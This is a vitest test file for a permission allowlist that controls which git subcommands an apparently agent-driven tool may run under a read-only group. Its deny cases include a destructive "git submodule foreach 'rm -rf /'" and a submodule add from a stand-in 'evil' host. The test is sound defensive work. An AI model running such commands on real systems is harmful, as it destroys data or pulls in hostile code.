import { describe, it, expect } from 'vitest';
import { Allowlist, type AllowlistConfig } from '../../src/permissions/allowlist.js';
import groups from '../../config/permission-groups.default.json' with { type: 'json' };

// `read` is documented as "local file reads + git-read-only". Its git alternation is the
// security-relevant part: every name in it is a subcommand eight actions can run with no
// further grant, so a name added for convenience is a grant added for everyone.
function readGroupChecker(): AllowlistConfig {
  const merged: AllowlistConfig = {
    alwaysAllow: [], alwaysAllowBashPatterns: [], alwaysAllowMcpPatterns: [], alwaysAllowPathPatterns: [],
  };
  for (const name of ['core', 'read'] as const) {
    const g = groups[name] as AllowlistConfig;
    for (const x of g.alwaysAllow) merged.alwaysAllow.push(x);
    for (const x of g.alwaysAllowBashPatterns) merged.alwaysAllowBashPatterns.push(x);
    for (const x of g.alwaysAllowMcpPatterns) merged.alwaysAllowMcpPatterns.push(x);
    for (const x of g.alwaysAllowPathPatterns ?? []) merged.alwaysAllowPathPatterns!.push(x);
  }
  return merged;
}

const al = new Allowlist(readGroupChecker());
const allows = (command: string) => al.allows('Bash', { command });

describe('the read group and git merge-base', () => {
  it('allows merge-base, which only prints a commit sha', () => {
    for (const c of [
      'git merge-base main HEAD',
      'git merge-base --fork-point origin/main',
      'git merge-base --is-ancestor origin/main HEAD',
      'git -C /repo merge-base origin/main HEAD',
    ]) expect(allows(c), c).toBe(true);
  });

  it('allows the three-dot spelling actions are told to use — quoted', () => {
    // Both clauses have to clear the bar: the substitution is judged as its own command.
    expect(allows('git diff "$(git merge-base origin/main HEAD)" HEAD')).toBe(true);
  });

  it('still denies the unquoted spelling, which is the expansion guard, not merge-base', () => {
    // Unquoted, the sha word-splits — the same hole `curl $X` is; nothing about merge-base
    // relaxes it. Action prose has to quote the substitution.
    expect(allows('git diff $(git merge-base origin/main HEAD) HEAD')).toBe(false);
  });

  it('does not admit git merge along with it', () => {
    for (const c of [
      'git merge origin/main',
      'git merge --abort',
      'git merge-base-something',
      'git mergetool',
    ]) expect(allows(c), c).toBe(false);
  });
});

// `git submodule status` is how an action learns whether a vendored path is populated and at
// which pin. It was denied, so code.spec rounds guessed — and `git -C <empty-submodule-dir> log`
// silently reports the PARENT repo's commits, so guessing wrong looks like an answer.
describe('the read group and git submodule', () => {
  it('allows the two read-only submodule subcommands', () => {
    for (const c of [
      'git submodule status',
      'git submodule status --recursive',
      'git submodule summary',
      'git -C /Users/x/other submodule status',
    ]) expect(allows(c), c).toBe(true);
  });

  it('admits nothing that writes or executes', () => {
    for (const c of [
      // These are the `edit` group's business, and `foreach` is not even that.
      'git submodule update --init',
      "git submodule foreach 'rm -rf /'",
      'git submodule add https://evil/x.git vendor',
      'git submodule deinit --all',
      'git submodule sync',
      'git submodule statuses',
    ]) expect(allows(c), c).toBe(false);
  });
});
